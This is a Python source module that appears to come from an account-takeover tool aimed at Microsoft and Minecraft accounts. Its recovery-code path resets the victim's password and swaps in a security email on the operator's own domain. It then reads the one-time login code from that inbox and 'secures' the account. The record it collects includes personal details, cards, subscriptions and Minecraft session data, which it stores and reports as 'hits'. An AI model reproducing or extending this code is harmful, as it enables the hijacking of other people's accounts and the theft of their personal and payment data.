from securing.utils.login_authenticator import login_authenticator
from securing.utils.cookies.get_livedata import livedata
from securing.utils.security.recovery import recover
from securing.utils.cookies.get_email_code import get_email_code
from securing.secure import startSecuringAccount
from securing.auth.send_auth import send_auth

from securing.build_embeds import build_account_embeds, build_failure_embed
from securing.auth.initial_session import get_session
from securing.auth.account_status import get_account_lock_reason
from securing.utils.secure import secure

from database.database import DBConnection
from time import time
import logging
import json
import uuid

config = json.load(open("config/config.json", "r"))


def _failure_result(
    email: str,
    reason: str,
    *,
    security_email: str | None = None,
    password: str | None = None,
    recovery_code: str | None = None,
    error: str | None = None,
) -> dict:
    ms = {
        "security_email": security_email or "Couldn't Change!",
        "password": password or "Couldn't Change!",
        "recovery_code": recovery_code or "Couldn't Change!",
    }
    detail = error or reason
    return {
        "failed": True,
        "reason": reason,
        "error": detail,
        "hit_embed": build_failure_embed(email, ms, reason, error=detail),
    }


def _flowtoken_from_auth(info: dict) -> tuple[str | None, str | None]:
    if not info:
        return None, "Microsoft login check returned no response."

    if info.get("type") == "authenticator":
        return None, "Account requires Microsoft Authenticator — email OTP is not available for this login step."

    response = info.get("response") if isinstance(info.get("response"), dict) else info
    credentials = response.get("Credentials", {}) if isinstance(response, dict) else {}
    proofs = credentials.get("OtcLoginEligibleProofs")

    if not proofs:
        auth_type = info.get("type", "unknown")
        return None, f"No email OTP method available after recovery (auth type: {auth_type})."

    return proofs[0]["data"], None


async def recovery_secure(email: str, method: str, data: dict) -> dict:

    session = get_session()

    account = {
        "microsoft": {
            "email": "Couldn't Change!",
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": "Couldn't Change!",
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get",
            "language": "Failed to Get",
            "family": [],
            "devices": [],
            "cards": [],
            "subscriptions": {
                "active": [], 
                "canceled": [], 
                "commercial": []
            },
            "phones": [],
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False
        }
    }
    
    initialTime = time()
    print("[~] - Logging in session...")

    match method:
        case "rcode":
            lock_reason = await get_account_lock_reason(email)
            if lock_reason:
                return _failure_result(
                    email,
                    f"Cannot secure: {lock_reason}",
                    error=lock_reason,
                )

            sname = uuid.uuid4().hex[:16]
            password = uuid.uuid4().hex[:12]
            security_email = f"{sname}@{config["domain"]}"
            print(f"[+] - Generated Security Email ({security_email})")

            with DBConnection() as database:
                database.add_security_email(security_email, password)

            new_recovery_code = None
            try:
                new_recovery_code = await recover(
                    session = session,
                    email = email,
                    recovery_code = data["recovery_code"],
                    new_email = security_email,
                    new_password = password
                )

                if not new_recovery_code:
                    return None

                print("[+] - Changed password and recovery code")

                info = await send_auth(session, email, security_email)
                flowtoken, auth_error = _flowtoken_from_auth(info)
                if auth_error:
                    return _failure_result(
                        email,
                        auth_error,
                        security_email=security_email,
                        password=password,
                        recovery_code=new_recovery_code,
                    )

                print(f"[~] - Getting email code...")
                code = await get_email_code(security_email)
                print(f"Got code - {code}")

                if not code:
                    return _failure_result(
                        email,
                        "Timed out waiting for OTP at the new security email.",
                        security_email=security_email,
                        password=password,
                        recovery_code=new_recovery_code,
                    )

                live = await livedata(session)
                ppft = live["ppft"]

                account = await startSecuringAccount(
                    session = session,
                    email = email,
                    device = flowtoken,
                    ppft = ppft,
                    code = code,
                    recovery = False,
                    rextra = {
                        "security_email": security_email,
                        "password": password,
                        "recovery_code": new_recovery_code
                    },
                    command = True
                )

                if isinstance(account, dict) and account.get("failed"):
                    return _failure_result(
                        email,
                        account.get("reason", "Login or securing failed after recovery code reset."),
                        security_email=security_email,
                        password=password,
                        recovery_code=new_recovery_code,
                        error=account.get("reason"),
                    )

                if not account:
                    return _failure_result(
                        email,
                        "Login or securing failed after recovery code reset.",
                        security_email=security_email,
                        password=password,
                        recovery_code=new_recovery_code,
                        error="startSecuringAccount returned no account data.",
                    )

                return account
            except Exception as exc:
                logging.exception("recovery_secure rcode failed for %s", email)
                if new_recovery_code:
                    return _failure_result(
                        email,
                        f"Securing step failed: {exc.__class__.__name__}: {exc}",
                        security_email=security_email,
                        password=password,
                        recovery_code=new_recovery_code,
                        error=f"{exc.__class__.__name__}: {exc}",
                    )
                raise
            
        case "authpwd":
            lock_reason = await get_account_lock_reason(email)
            if lock_reason:
                return _failure_result(
                    email,
                    f"Cannot secure: {lock_reason}",
                    error=lock_reason,
                )

            response = await login_authenticator(
                session = session,
                email = email,
                data = data
            )

            if not response:
                return "invalid"
            
            dsecured = await secure(
                session = session,
                recovery = True, 
                account_info = account, 
                command = True
            )

    logging.info(f"Account: {dsecured}")

    final_time = (time() - initialTime)

    account_id = uuid.uuid4().hex
    with DBConnection() as database:
        database.add_secured_account(account_id, dsecured)

    build_account = await build_account_embeds(dsecured, final_time, account_id)
    return build_account